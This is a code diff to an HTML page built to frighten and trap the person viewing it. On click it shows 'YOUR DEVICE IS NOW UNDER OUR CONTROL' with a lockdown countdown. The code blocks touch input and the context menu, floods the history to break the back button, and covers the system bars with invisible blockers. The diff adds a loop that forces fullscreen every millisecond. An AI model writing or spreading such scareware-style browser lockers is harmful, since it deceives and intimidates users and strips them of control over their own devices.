@@ -15,8 +15,6 @@ p { font-size:1.6rem; max-width:90%; line-height:1.8; }
 @keyframes glitch { 0%{text-shadow:3px 3px #0ff,-3px -3px #f0f;} 50%{text-shadow:-3px -3px #0ff,3px 3px #f0f;} 100%{text-shadow:3px 3px #0ff,-3px -3px #f0f;} }
 .matrix { position:absolute; top:0; left:0; right:0; bottom:0; opacity:0.15; background:repeating-linear-gradient(0deg,#0f0,#0f0 1px,transparent 1px,transparent 2px); animation:rain 8s linear infinite; pointer-events:none; z-index:1; }
 @keyframes rain { 0%{transform:translateY(-100%);} 100%{transform:translateY(100%);} }
-
-/* Strong blockers for top (status/quick settings) and bottom (navigation buttons) */
 #topBlocker { position:fixed; top:0; left:0; right:0; height:250px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
 #bottomBlocker { position:fixed; bottom:0; left:0; right:0; height:250px; background:transparent; z-index:9999; pointer-events:auto; display:none; }
 </style>
@@ -33,12 +31,12 @@ p { font-size:1.6rem; max-width:90%; line-height:1.8; }
 <p style="color:#f00; font-size:2.2rem; margin-top:50px;">YOUR DEVICE IS NOW UNDER OUR CONTROL</p>
 </div>
 
-<!-- Blockers -->
 <div id="topBlocker"></div>
 <div id="bottomBlocker"></div>
 
 <script>
 let time = 20;
+let lockdownActive = false;
 const start = document.getElementById('start');
 const overlay = document.getElementById('overlay');
 const countdown = document.getElementById('countdown');
@@ -50,61 +48,52 @@ document.body.addEventListener('click', startLockdown, {once: true});
 
 async function startLockdown(e) {
   e.preventDefault();
+  lockdownActive = true;
   start.style.display = 'none';
   overlay.style.display = 'flex';
-
   topBlocker.style.display = 'block';
   bottomBlocker.style.display = 'block';
 
-  if (document.documentElement.requestFullscreen) {
-    await document.documentElement.requestFullscreen({ navigationUI: "hide" });
-  }
+  requestFullScreen();
 
   // Max touch freeze
   document.addEventListener('touchstart', e => e.preventDefault(), { passive: false });
   document.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
   document.addEventListener('touchend', e => e.preventDefault(), { passive: false });
 
-  // ULTRA back block
+  // Back block
   for(let i = 0; i < 500; i++) {
     history.pushState(null, null, location.href);
   }
-  window.onpopstate = () => {
-    history.pushState(null, null, location.href);
-    requestFullScreen();
-  };
-  window.addEventListener('keydown', e => {
-    if (e.key === 'Backspace' || e.key === 'ArrowLeft' || e.key === 'Escape') {
-      e.preventDefault();
+  window.onpopstate = () => history.pushState(null, null, location.href);
+
+  // FORCE fullscreen every millisecond during lockdown
+  const forceInterval = setInterval(() => {
+    if (lockdownActive && !document.fullscreenElement) {
       requestFullScreen();
     }
-  });
-
-  // Re-enter fullscreen if exited
-  document.addEventListener('fullscreenchange', () => {
-    if (!document.fullscreenElement) {
-      requestFullScreen();
-    }
-  });
-
-  function requestFullScreen() {
-    if (document.documentElement.requestFullscreen) {
-      document.documentElement.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
-    }
-  }
+  }, 1); // Every millisecond re-check and re-enter
 
   const timer = setInterval(() => {
     time--;
     countdown.textContent = `SYSTEM LOCKDOWN: ${time}`;
     if (time <= 0) {
       clearInterval(timer);
+      clearInterval(forceInterval);
       countdown.textContent = "SYSTEM LOCKED";
       endLockdown();
     }
   }, 1000);
 }
 
+function requestFullScreen() {
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen({ navigationUI: "hide" }).catch(() => {});
+  }
+}
+
 function endLockdown() {
+  lockdownActive = false;
   topBlocker.style.display = 'none';
   bottomBlocker.style.display = 'none';
   if (document.exitFullscreen) document.exitFullscreen();
@@ -113,4 +102,4 @@ function endLockdown() {
 document.addEventListener('contextmenu', e => e.preventDefault());
 </script>
 </body>
-</html>
+                       </html>
